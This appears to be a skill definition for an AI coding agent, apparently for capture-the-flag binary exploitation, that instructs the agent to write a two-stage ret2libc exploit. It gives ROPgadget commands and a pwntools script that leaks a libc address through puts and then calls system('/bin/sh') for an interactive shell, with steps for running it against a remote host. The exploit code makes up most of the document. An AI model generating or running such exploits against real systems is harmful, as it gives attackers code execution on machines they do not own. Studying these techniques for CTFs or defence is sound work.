---
name: pwn-ret2libc
description: Generate ret2libc exploit template with libc leak and system call
argument-hint: "<binary> [--libc path] [--offset N]"
allowed-tools: ["Bash", "Read", "Write", "AskUserQuestion"]
---

# PWN ret2libc - Return to Libc Template

Generate a complete ret2libc exploit with two-stage leak and shell.

## Execution Steps

### Step 1: Gather Information

Required:
- Binary path
- Offset to return address

Optional:
- Libc path (if not provided, will use leak to identify)
- Remote host:port

If offset unknown, suggest running `/pwn-dynamic` first.

### Step 2: Find Gadgets

```bash
ROPgadget --binary <binary> | grep "pop rdi ; ret"
ROPgadget --binary <binary> | grep ": ret$"
```

### Step 3: Generate Template

Create exploit with:
- Stage 1: Leak puts/printf/write GOT entry
- Return to main/vuln for second input
- Stage 2: system("/bin/sh") with calculated base

### Step 4: Save Exploit

Write to `exploit.py` with all values filled in.

## Generated Template Structure

```python
#!/usr/bin/env python3
"""
ret2libc Exploit Template
Target: <binary>
Vulnerability: Buffer overflow
Technique: Two-stage ret2libc
"""
from pwn import *

# === CONFIGURATION ===
BINARY = './<binary>'
OFFSET = <offset>  # Offset to RIP

# Gadgets (from ROPgadget)
POP_RDI = <address>  # pop rdi ; ret
RET = <address>      # ret (for stack alignment)

# === SETUP ===
elf = ELF(BINARY)
context.binary = elf
context.log_level = 'info'

# Libc (update after identification)
# libc = ELF('./libc.so.6')

def conn():
    if args.REMOTE:
        return remote(args.HOST, int(args.PORT))
    elif args.GDB:
        return gdb.debug(BINARY, '''
            b main
            c
        ''')
    else:
        return process(BINARY)

def main():
    io = conn()

    # === STAGE 1: LEAK LIBC ===
    log.info("Stage 1: Leaking libc address...")

    payload1 = flat(
        b'A' * OFFSET,
        POP_RDI,
        elf.got['puts'],
        elf.plt['puts'],
        elf.symbols['main']  # Return to main
    )

    io.sendlineafter(b'prompt', payload1)  # Adjust prompt

    # Parse leak
    leak = u64(io.recvline().strip().ljust(8, b'\\x00'))
    log.success(f"Leaked puts@libc: {hex(leak)}")

    # Calculate libc base (update offset for your libc)
    # libc.address = leak - libc.symbols['puts']
    # log.success(f"libc base: {hex(libc.address)}")

    # === STAGE 2: GET SHELL ===
    log.info("Stage 2: Calling system('/bin/sh')...")

    payload2 = flat(
        b'A' * OFFSET,
        RET,  # Stack alignment
        POP_RDI,
        # next(libc.search(b'/bin/sh')),
        # libc.symbols['system']
    )

    io.sendline(payload2)
    io.interactive()

if __name__ == '__main__':
    main()
```

## Usage Instructions

```bash
# 1. Find gadgets and update addresses
ROPgadget --binary ./binary | grep -E "(pop rdi|: ret$)"

# 2. Test locally
python3 exploit.py

# 3. Identify libc from leak (use libc.blukat.me)
# 4. Update libc path and uncomment libc lines
# 5. Test again locally with correct libc

# 6. Run remote
python3 exploit.py REMOTE HOST=<ip> PORT=<port>
```
